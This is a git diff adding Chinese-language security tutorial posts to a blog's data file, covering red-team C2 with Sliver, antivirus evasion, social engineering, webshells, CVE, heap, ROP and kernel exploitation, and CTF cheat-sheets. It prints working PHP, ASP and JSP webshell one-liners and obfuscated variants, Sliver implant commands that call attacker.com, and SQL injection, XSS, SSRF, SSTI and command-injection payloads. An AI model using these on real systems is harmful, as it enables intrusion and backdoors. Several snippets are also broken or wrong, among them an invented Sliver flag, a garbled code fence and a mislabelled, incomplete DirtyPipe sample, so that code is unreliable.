@@ -157,6 +157,39 @@ export const categories = [
       { id: 'sast-dast', name: 'SAST/DAST' },
     ]
   },
+  {
+    id: 'redteam',
+    name: '红队技术',
+    icon: '🎯',
+    children: [
+      { id: 'c2-framework', name: 'C2 框架' },
+      { id: 'evasion', name: '免杀技术' },
+      { id: 'social-eng', name: '社会工程学' },
+      { id: 'webshell', name: 'Webshell 技术' },
+    ]
+  },
+  {
+    id: 'vuln-analysis',
+    name: '漏洞分析',
+    icon: '🔍',
+    children: [
+      { id: 'cve-analysis', name: 'CVE 漏洞分析' },
+      { id: 'heap-overflow', name: '堆溢出利用' },
+      { id: 'rop', name: 'ROP 技术' },
+      { id: 'kernel-exploit', name: '内核漏洞利用' },
+    ]
+  },
+  {
+    id: 'ctf',
+    name: 'CTF 竞赛',
+    icon: '🏆',
+    children: [
+      { id: 'ctf-web', name: 'Web 方向' },
+      { id: 'ctf-pwn', name: 'PWN 方向' },
+      { id: 'ctf-re', name: '逆向方向' },
+      { id: 'ctf-crypto', name: '密码学方向' },
+    ]
+  },
 ]
 
 export const posts = [
@@ -3958,6 +3991,1190 @@ nuclei -u http://target.com -t cves/
 | 阶段 | 开发早期 | 测试/生产 |
 | 覆盖率 | 高 | 低 |
 | 误报率 | 较高 | 较低 |
+    `
+  },
+  // 红队技术
+  {
+    slug: 'c2-frameworks',
+    title: 'C2 框架深度对比',
+    date: '2026-06-20',
+    category: 'redteam',
+    subcategory: 'c2-framework',
+    tags: ['红队', 'C2', '框架'],
+    summary: '主流 C2 框架对比和实战配置。',
+    content: `
+## 什么是 C2
+
+C2（Command and Control）命令与控制框架，用于红队渗透测试中管理被控主机。
+
+## 主流框架对比
+
+| 框架 | 特点 | 适用场景 |
+|------|------|----------|
+| CobaltStrike | 商业，功能全面 | 企业红队 |
+| Sliver | 开源，Go编写 | 技术研究 |
+| Havoc | 开源，现代化 | 技术研究 |
+| Mythic | 开源，模块化 | 技术研究 |
+| Brute Ratel | 商业，免杀强 | 高级红队 |
+
+## Sliver 基础
+
+### 安装
+
+\`\`\`bash
+# 安装
+go install github.com/BishopFox/sliver/client@latest
+
+# 或使用预编译版本
+\`\`\`
+
+### 生成 Payload
+
+\`\`\`bash
+# HTTP
+sliver> generate --mtls attacker.com --os windows --arch amd64 --save ./beacon.exe
+
+# DNS
+sliver> generate --dns domain.com --os linux --save ./beacon
+
+# 会话生成
+sliver> generate --mtls attacker.com --save ./implant --session-lifetime 24h
+\`\`\`
+
+### 会话管理
+
+\`\`\`bash
+sliver> sessions              # 查看会话
+sliver> use <session_id>      # 切换会话
+sliver> background            # 后台运行
+\`\`\`
+
+### 常用命令
+
+\`\`\`bash
+sliver> info                  # 系统信息
+sliver> ls                    # 列出文件
+sliver> cd                    # 切换目录
+sliver> upload / download     # 传输文件
+sliver> shell                 # 交互Shell
+sliver> execute               # 执行文件
+sliver> screenshots           # 截屏
+sliver> keylog                # 键盘记录
+\`\`\`
+
+## 通信协议
+
+### MTLS（双向TLS）
+最安全，需要证书。
+
+### HTTP(S)
+隐蔽性好，不易被检测。
+
+### DNS
+适合严格防火墙环境。
+
+### WireGuard
+VPN隧道，稳定。
+
+## 流量混淆
+
+\`\`\`bash
+# Sliver 自定义混淆
+sliver> generate --mtls attacker.com --混淆 --保存
+
+# 使用 CDN
+sliver> generate --cdn cloudfront.net --save ./beacon.exe
+\`\`\`
+
+## 防检测
+
+1. 使用自定义Profile
+2. 流量加密
+3. 通信混淆
+4. 域前置（Domain Fronting）
+5. 多级跳板
+    `
+  },
+  {
+    slug: 'evasion-techniques',
+    title: '免杀技术详解',
+    date: '2026-06-18',
+    category: 'redteam',
+    subcategory: 'evasion',
+    tags: ['红队', '免杀', '对抗'],
+    summary: '绕过杀软检测的技术方法。',
+    content: `
+## 什么是免杀
+
+免杀（AV Evasion）是绕过杀毒软件检测的技术。
+
+## 检测方式
+
+### 静态检测
+- 特征码匹配
+- 文件哈希
+- PE 结构分析
+
+### 动态检测
+- 行为监控
+- 沙箱检测
+- 内存扫描
+
+## 免杀方法
+
+### 1. 加壳
+
+\`\`\`bash
+# UPX
+upx -9 payload.exe
+
+# Themida
+# VMProtect
+\`\`\`
+
+### 2. 代码混淆
+
+\`\`\`python
+# 字符串加密
+import base64
+encoded = base64.b64encode("cmd.exe".encode())
+\`\`\`
+
+### 3. 多态/变形
+
+\`\`\`
+# 每次生成不同代码
+# 相同功能，不同形态
+\`\`\`
+
+### 4. 内存加载
+
+\`\`\`python
+# 不写入磁盘
+import ctypes
+ctypes.windll.kernel32.VirtualAlloc(...)
+ctypes.windll.kernel32.RtlMoveMemory(...)
+\`\`\`
+
+### 5. 反射DLL注入
+
+\`\`\`python
+# 从内存加载DLL
+import ctypes
+dll = ctypes.windll.kernel32.LoadLibrary("payload.dll")
+\`\`\`
+
+### 6. 进程注入
+
+\`\`\`python
+# 注入到合法进程
+# Process Hollowing
+# DLL Injection
+\`\`\`
+
+### 7. API 调用混淆
+
+\`\`\`
+# 使用非常规API
+# 动态获取API地址
+# 加密API字符串
+\`\`\`
+
+### 8. 供应链攻击
+
+\`\`\`
+# 污染合法软件
+# 通过更新分发
+\`\`\`
+
+## 测试工具
+
+\`\`\`bash
+# VirusTotal 检测
+vt scan file payload.exe
+
+# 本地测试
+# 多引擎检测网站
+\`\`\`
+
+## 对抗趋势
+
+1. EDR 检测增强
+2. 内存扫描普及
+3. 行为分析增强
+4. 云查杀普及
+    `
+  },
+  {
+    slug: 'social-engineering',
+    title: '社会工程学攻击',
+    date: '2026-06-15',
+    category: 'redteam',
+    subcategory: 'social-eng',
+    tags: ['红队', '社会工程', '钓鱼'],
+    summary: '社会工程学攻击技术和防御方法。',
+    content: `
+## 什么是社会工程学
+
+利用人的心理弱点，通过欺骗手段获取敏感信息或执行操作。
+
+## 攻击类型
+
+### 1. 钓鱼攻击
+
+#### 邮件钓鱼
+
+\`\`\`
+# 常见主题
+- 账户验证
+- 密码重置
+- 发票通知
+- HR通知
+
+# 技术手段
+- 仿冒域名
+- 伪造发件人
+- 恶意链接/附件
+\`\`\`
+
+#### 鱼叉式钓鱼
+
+\`\`\`
+# 针对特定目标
+- 收集目标信息
+- 定制化内容
+- 高成功率
+\`\`\`
+
+### 2. 水坑攻击
+
+\`\`\`
+# 感染目标常访问的网站
+# 等待目标访问
+# 植入恶意代码
+\`\`\`
+
+### 3. 电话攻击
+
+\`\`\`
+# 冒充技术支持
+- "您的账户有异常"
+- "需要验证身份"
+- "请提供密码"
+\`\`\`
+
+### 4. 物理攻击
+
+\`\`\`
+# 尾随进入
+# 假冒身份
+# USB投放
+\`\`\`
+
+## 信息收集
+
+### OSINT
+
+\`\`\`
+# 社交媒体
+- LinkedIn：职业信息
+- Facebook：个人关系
+- Twitter：兴趣爱好
+
+# 公司信息
+- 官网
+- 新闻稿
+- 招聘信息
+\`\`\`
+
+### 技术手段
+
+\`\`\`
+# 邮箱收集
+theHarvester -d target.com -b google
+
+# 密码泄露
+Have I Been Pwned
+\`\`\`
+
+## 防御
+
+1. 安全意识培训
+2. 多因素认证
+3. 邮件网关
+4. 安全策略
+5. 演练测试
+    `
+  },
+  {
+    slug: 'webshell-techniques',
+    title: 'Webshell 高级技术',
+    date: '2026-06-12',
+    category: 'redteam',
+    subcategory: 'webshell',
+    tags: ['红队', 'Webshell', '后门'],
+    summary: 'Webshell 加密、混淆和高级技术。',
+    content: `
+## 一句话木马
+
+### PHP
+
+\`\`\`php
+<?php eval($_POST['cmd']); ?>
+<?php system($_GET['cmd']); ?>
+<?php @eval($_POST['a']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+\`\`\`
+
+### ASP
+
+\`\`\`asp
+<%eval request("cmd")%>
+<% execute(request("cmd"))%>
+\`\`\`
+
+### JSP
+
+\`\`\`jsp
+<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+\`\`\`
+
+## 加密 Webshell
+
+### PHP Base64
+
+\`\`\`php
+<?php
+$a = "base64编码的代码";
+eval(base64_decode($a));
+?>
+\`\rypt\`
+
+### PHP 异或
+
+\`\`\`php
+<?php
+$a='!((%^$#...';  // 异或结果
+eval($a);
+?>
+\`\`\`
+
+## 免杀 Webshell
+
+### 动态函数调用
+
+\`\`\`php
+<?php
+\\$func = \\$_GET['func'];
+\\$func(\\$_GET['cmd']);
+?>
+\`\`\`
+
+### 回调函数
+
+\`\`\`php
+<?php
+\\$callback = create_function('', \\$_POST['code']);
+\\$callback();
+?>
+\`\`\`
+
+## 大马
+
+### 功能型
+
+\`\`\`php
+<?php
+// 文件管理
+// 数据库管理
+// 命令执行
+// 提权功能
+\`\`\`
+
+## Webshell 管理工具
+
+### 中国蚁剑（AntSword）
+
+\`\`\`
+# 特点
+- 跨平台
+- 多语言支持
+- 插件丰富
+\`\`\`
+
+### 哥斯拉（Godzilla）
+
+\`\`\`
+# 特点
+- 加密通信
+- 多种加密方式
+- 内存马支持
+\`\`\`
+
+### 冰蝎（Behinder）
+
+\`\`\`
+# 特点
+- AES加密
+- 内存马
+- 动态加载
+\`\`\`
+
+## 内存马
+
+### 无文件 Webshell
+
+\`\`\`java
+# Servlet型
+# Filter型
+# Listener型
+# Spring Controller型
+\`\`\`
+
+## 防御
+
+1. WAF 检测
+2. 文件完整性监控
+3. 流量检测
+4. 行为分析
+5. 定期扫描
+    `
+  },
+  // 漏洞分析
+  {
+    slug: 'cve-analysis',
+    title: 'CVE 漏洞分析方法',
+    date: '2026-06-17',
+    category: 'vuln-analysis',
+    subcategory: 'cve-analysis',
+    tags: ['漏洞分析', 'CVE', '安全研究'],
+    summary: 'CVE 漏洞分析和复现方法。',
+    content: `
+## 什么是 CVE
+
+CVE（Common Vulnerabilities and Exposures）通用漏洞披露，用于标识漏洞的标准化系统。
+
+## CVE 信息来源
+
+- https://cve.mitre.org/
+- https://nvd.nist.gov/
+- https://漏洞平台
+
+## 分析流程
+
+### 1. 漏洞信息收集
+
+\`\`\`
+- CVE 编号
+- 影响版本
+- 漏洞描述
+- PoC/EXP
+- 修复方案
+\`\`\`
+
+### 2. 环境搭建
+
+\`\`\`bash
+# Docker 快速搭建
+docker pull vulnerable-app:version
+docker run -d -p 8080:80 vulnerable-app
+
+# 靶场
+Vulhub
+VulApps
+\`\`\`
+
+### 3. 漏洞验证
+
+\`\`\`bash
+# 使用 PoC
+python poc.py -t http://target:8080
+
+# 手动验证
+curl -X POST http://target/vuln -d "param=malicious"
+\`\`\`
+
+### 4. 漏洞分析
+
+\`\`\`
+# 阅读补丁
+git diff old_version new_version
+
+# 代码审计
+# 反编译分析
+# 调试跟踪
+\`\`\`
+
+### 5. EXP 开发
+
+\`\`\`python
+# 编写利用脚本
+import requests
+
+def exploit(target):
+    payload = "malicious_code"
+    r = requests.post(f"{target}/vuln", data={"param": payload})
+    return r.text
+\`\`\`
+
+## 常见漏洞类型
+
+| 类型 | 示例 |
+|------|------|
+| RCE | Log4j, Spring4Shell |
+| 反序列化 | Fastjson, Shiro |
+| 注入 | SQLi, LDAPi |
+| SSRF | XXE, SSRF |
+| 权限提升 | DirtyPipe |
+
+## 漏洞复现环境
+
+### Vulhub
+
+\`\`\`bash
+git clone https://github.com/vulhub/vulhub
+cd vulhub/log4j/CVE-2021-44228
+docker-compose up -d
+\`\`\`
+    `
+  },
+  {
+    slug: 'heap-overflow',
+    title: '堆溢出利用技术',
+    date: '2026-06-14',
+    category: 'vuln-analysis',
+    subcategory: 'heap-overflow',
+    tags: ['漏洞利用', '堆溢出', 'PWN'],
+    summary: '堆溢出漏洞原理和利用方法。',
+    content: `
+## 堆的基本概念
+
+### 堆管理
+
+\`\`\`
+┌─────────────────┐
+│ chunk header    │ ← size + flags
+├─────────────────┤
+│ user data       │
+├─────────────────┤
+│ prev_size       │
+├─────────────────┤
+│ chunk header    │
+└─────────────────┘
+\`\`\`
+
+### 堆分配
+
+\`\`\`
+malloc(size)  → 分配堆块
+free(ptr)     → 释放堆块
+\`\`\`
+
+## 常见漏洞
+
+### 1. Use-After-Free（UAF）
+
+\`\`\`c
+char *ptr = malloc(32);
+free(ptr);
+// ptr 未置空
+ptr[0] = 'A';  // 使用已释放内存
+\`\`\`
+
+### 2. Double Free
+
+\`\`\`c
+char *ptr = malloc(32);
+free(ptr);
+free(ptr);  // 重复释放
+\`\`\`
+
+### 3. Off-By-One
+
+\`\`\`c
+char buf[32];
+gets(buf);  // 溢出一个字节
+\`\`\`
+
+### 4. House of系列
+
+- **House of Force**：利用 top chunk
+- **House of Spirit**：伪造空闲块
+- **House of Lore**：利用 smallbin
+- **House of Orange**：利用 top chunk
+
+## GDB 调试
+
+\`\`\`bash
+# 堆块信息
+pheap 10
+
+# 查看所有堆块
+find 0xdeadbeef
+
+# watch 点
+watch *(int*)0x12345678
+\`\`\`
+
+## 防御
+
+1. Canary 保护
+2. ASLR
+3. PIE
+4. 堆保护机制
+    `
+  },
+  {
+    slug: 'rop-technique',
+    title: 'ROP 返回导向编程',
+    date: '2026-06-11',
+    category: 'vuln-analysis',
+    subcategory: 'rop',
+    tags: ['漏洞利用', 'ROP', 'PWN'],
+    summary: 'ROP 技术原理和利用方法。',
+    content: `
+## 什么是 ROP
+
+ROP（Return-Oriented Programming）返回导向编程，利用已有代码片段（gadget）构造攻击链。
+
+## 基本原理
+
+\`\`\`
+┌─────────────────┐
+│ gadget1         │ → pop rdi; ret
+├─────────────────┤
+│ gadget2         │ → mov rax, 1; ret
+├─────────────────┤
+│ ...             │
+└─────────────────┘
+\`\`\`
+
+## Gadget 查找
+
+### ROPgadget
+
+\`\`\`bash
+# 查找所有gadget
+ROPgadget --binary target --ropchain
+
+# 查找特定gadget
+ROPgadget --binary target | grep "pop rdi"
+\`\`\`
+
+### ropper
+
+\`\`\`bash
+ropper --file target --search "pop rdi"
+\`\`\`
+
+## ROP 构造
+
+### ret2libc
+
+\`\`\`python
+from pwn import *
+
+# 获取 libc 地址
+system = libc.symbols['system']
+bin_sh = next(libc.search(b'/bin/sh'))
+
+# 构造 ROP
+rop = ROP(libc)
+rop.call(system, [bin_sh])
+\`\`\`
+
+### 通用 gadget
+
+\`\`\`python
+# 搜索通用 gadget
+pop_rdi = 0x401234  # pop rdi; ret
+ret = 0x40101a      # ret
+
+payload = b'A' * offset
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(system)
+\`\`\`
+
+## 防御
+
+1. ROP 保护
+2. 控制流完整性（CFI）
+3. CET（Intel Control-flow Enforcement Technology）
+    `
+  },
+  {
+    slug: 'kernel-exploit',
+    title: '内核漏洞利用',
+    date: '2026-06-08',
+    category: 'vuln-analysis',
+    subcategory: 'kernel-exploit',
+    tags: ['漏洞利用', '内核', '提权'],
+    summary: 'Linux 内核漏洞利用技术。',
+    content: `
+## 内核漏洞类型
+
+### 1. 本地提权
+
+\`\`\`
+# DirtyCow (CVE-2016-5195)
+# DirtyPipe (CVE-2022-0847)
+# 经典竞态条件
+\`\`\`
+
+### 2. 内核 RCE
+
+\`\`\`
+# 内核模块漏洞
+# 网络协议栈漏洞
+\`\`\`
+
+## DirtyPipe (CVE-2022-0847)
+
+### 影响版本
+
+\`\`\`
+Linux 5.8+
+\`\`\`
+
+### 漏洞原理
+
+\`\`\`c
+// 竞态条件导致覆写页面缓存
+pipe_write() 与 splice() 竞争
+\`\`\`
+
+### 利用代码
+
+\`\`\`c
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+
+int main() {
+    int p[2];
+    pipe(p);
+    
+    // 覆写 /etc/passwd
+    const char *payload = "root2::0:0::/root:/bin/sh\\n";
+    write(p[1], payload, strlen(payload));
+    
+    splice(p[0], NULL, fd, NULL, 1, 0);
+    return 0;
+}
+\`\`\`
+
+## 内核调试
+
+### QEMU + GDB
+
+\`\`\`bash
+# 启动内核
+qemu-system-x86_64 -kernel bz-append -initrd initramfs.cpio.gz -s -S
+
+# GDB 连接
+gdb vmlinux
+target remote :1234
+\`\`\`
+
+### 常用调试命令
+
+\`\`\`bash
+# 查看进程信息
+p current
+
+# 查看 task_struct
+p *(struct task_struct *)current
+
+# 查看 cred
+p current->cred
+\`\`\`
+
+## 内核保护
+
+| 保护 | 说明 |
+|------|------|
+| SMEP | 禁止内核执行用户空间代码 |
+| SMAP | 禁止内核访问用户空间数据 |
+| KASLR | 内核地址空间随机化 |
+| KPTI | 内核页表隔离 |
+
+## 防御
+
+1. 及时更新内核
+2. 启用保护机制
+3. 限制内核模块加载
+4. 使用 grsecurity/PaX
+    `
+  },
+  // CTF 竞赛
+  {
+    slug: 'ctf-web',
+    title: 'CTF Web 方向指南',
+    date: '2026-06-16',
+    category: 'ctf',
+    subcategory: 'ctf-web',
+    tags: ['CTF', 'Web', '竞赛'],
+    summary: 'CTF Web 方向常见题型和解题思路。',
+    content: `
+## 常见题型
+
+### 1. SQL 注入
+
+\`\`\`sql
+# 无过滤
+' union select 1,2,3-- -
+
+# 绕过过滤
+/**/替代空格
+大小写混合
+\`\`\`
+
+### 2. XSS
+
+\`\`\`html
+# 反射型
+<script>alert(1)</script>
+
+# 存储型
+评论区注入
+
+# DOM型
+URL参数注入
+\`\`\`
+
+### 3. 文件上传
+
+\`\`\`
+# 绕过限制
+.php5, .phtml
+大小写：.PhP
+图片马
+\`\`\`
+
+### 4. 反序列化
+
+\`\`\`php
+# PHP
+O:4:"User":1:{s:4:"name";s:5:"admin";}
+
+# Python
+__import__('os').popen('whoami').read()
+\`\`\`
+
+### 5. 命令注入
+
+\`\`\`bash
+# 管道符
+; |
+|| &&
+
+# 空格绕过
+\\$IFS
+{cmd,arg}
+\`\`\`
+
+### 6. SSTI
+
+\`\`\`jinja2
+# Jinja2
+{{7*7}}  → 49
+{{config}}
+
+# Tplmap 工具
+tplmap -u http://target/?param=1
+\`\`\`
+
+### 7. SSRF
+
+\`\`\`
+# 协议利用
+file:///etc/passwd
+gopher://127.0.0.1:6379/
+\`\`\`
+
+## 常用工具
+
+- Burp Suite
+- sqlmap
+- dirsearch
+- xssstrike
+- tplmap
+
+## 解题思路
+
+1. 信息收集
+2. 漏洞识别
+3. 漏洞利用
+4. 获取 flag
+    `
+  },
+  {
+    slug: 'ctf-pwn',
+    title: 'CTF PWN 方向指南',
+    date: '2026-06-13',
+    category: 'ctf',
+    subcategory: 'ctf-pwn',
+    tags: ['CTF', 'PWN', '二进制'],
+    summary: 'CTF PWN 方向常见题型和解题思路。',
+    content: `
+## 常见题型
+
+### 1. 栈溢出
+
+\`\`\`python
+from pwn import *
+
+# 覆盖返回地址
+payload = b'A' * offset
+payload += p64(shellcode_addr)
+\`\`\`
+
+### 2. 格式化字符串
+
+\`\`\`python
+# 读取栈数据
+payload = '%x.%x.%x.%x'
+
+# 写入数据
+payload = p64(target_addr) + '%100n'
+\`\`\`
+
+### 3. 堆利用
+
+\`\`\`
+# UAF
+# Double Free
+# House of系列
+\`\`\`
+
+### 4. ROP
+
+\`\`\`python
+rop = ROP ELF
+rop.call('system', [next(elf.search(b'/bin/sh'))])
+\`\`\`
+
+## 工具
+
+### Pwntools
+
+\`\`\`python
+from pwn import *
+
+p = remote('ctf.target.com', 1337)
+# 或
+p = process('./binary')
+
+# 发送payload
+p.sendline(payload)
+
+# 接收
+print(p.recvline())
+\`\`\`
+
+### ROPgadget
+
+\`\`\`bash
+ROPgadget --binary target --ropchain
+\`\`\`
+
+### GDB 插件
+
+\`\`\`bash
+# pwndbg
+pwndbg> heap
+pwndbg> vis_heap_chunks
+\`\`\`
+
+## 解题步骤
+
+1. 文件分析（file, checksec）
+2. 反编译分析
+3. 找到漏洞点
+4. 构造 payload
+5. 编写 exploit
+    `
+  },
+  {
+    slug: 'ctf-re',
+    title: 'CTF 逆向方向指南',
+    date: '2026-06-10',
+    category: 'ctf',
+    subcategory: 'ctf-re',
+    tags: ['CTF', '逆向', '竞赛'],
+    summary: 'CTF 逆向方向常见题型和解题思路。',
+    content: `
+## 常见题型
+
+### 1. 简单逆向
+
+\`\`\`
+# IDA 反编译
+# 分析逻辑
+# 编写解密脚本
+\`\`\`
+
+### 2. 反调试绕过
+
+\`\`\`c
+# ptrace 检测
+if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
+    exit(1);
+}
+
+# 时间检测
+start = time();
+// 代码
+end = time();
+if (end - start > 1) {
+    exit(1);
+}
+\`\`\`
+
+### 3. 算法还原
+
+\`\`\`
+# TEA/XTEA
+# RC4
+# AES/DES
+# 自定义算法
+\`\`\`
+
+### 4. 虚拟机
+
+\`\`\`
+# 自定义VM
+# 分析指令集
+# 编写反汇编器
+\`\`\`
+
+## 工具
+
+### IDA Pro
+
+\`\`\`
+# 快捷键
+F5: 反编译
+X: 交叉引用
+N: 重命名
+\`\`\`
+
+### Ghidra
+
+\`\`\`
+# 免费替代
+# 内置反编译器
+\`\`\`
+
+### angr
+
+\`\`\`python
+# 符号执行
+import angr
+
+p = angr.Project('./binary')
+state = p.factory.entry_state()
+simgr = p.factory.simgr(state)
+
+# 找到目标地址
+simgr.explore(find=0x401234, avoid=0x401256)
+\`\`\`
+
+## 解题步骤
+
+1. file 查看文件类型
+2. IDA/Ghidra 反编译
+3. 分析关键函数
+4. 编写解密脚本
+    `
+  },
+  {
+    slug: 'ctf-crypto',
+    title: 'CTF 密码学方向指南',
+    date: '2026-06-07',
+    category: 'ctf',
+    subcategory: 'ctf-crypto',
+    tags: ['CTF', '密码学', '竞赛'],
+    summary: 'CTF 密码学方向常见题型和解题思路。',
+    content: `
+## 常见题型
+
+### 1. 经典密码
+
+\`\`\`
+# 凯撒密码
+def caesar_decode(text, shift):
+    return ''.join(chr((ord(c) - ord('a') - shift) % 26 + ord('a')) for c in text)
+
+# ROT13
+text.encode().decode('rot_13')
+\`\`\`
+
+### 2. Base64 变种
+
+\`\`\`
+# 自定义字符表
+# 修改 padding
+\`\`\`
+
+### 3. RSA
+
+\`\`\`python
+# 小公钥指数
+# 共模攻击
+# 因数分解
+\`\`\`
+
+### 4. AES/DES
+
+\`\`\`python
+# ECB 模式攻击
+# Padding Oracle
+# 已知明文攻击
+\`\`\`
+
+### 5. 哈希长度扩展
+
+\`\`\`python
+# HashPump 工具
+hashpump -s original_sig -d original_data -a append_data -k key_length
+\`\`\`
+
+## 工具
+
+### SageMath
+
+\`\`\`python
+# 数学计算
+from sage.all import *
+
+# 因数分解
+factor(n)
+\`\`\`
+
+### CyberChef
+
+\`\`\`
+# 在线工具
+# 编码解码
+# 加密解密
+\`\`\`
+
+### yafu
+
+\`\`\`bash
+# 大数因数分解
+yafu "factor(n)"
+\`\`\`
+
+## 解题步骤
+
+1. 识别加密方式
+2. 分析弱点
+3. 编写攻击脚本
+4. 解密获取 flag
     `
   },
 ]
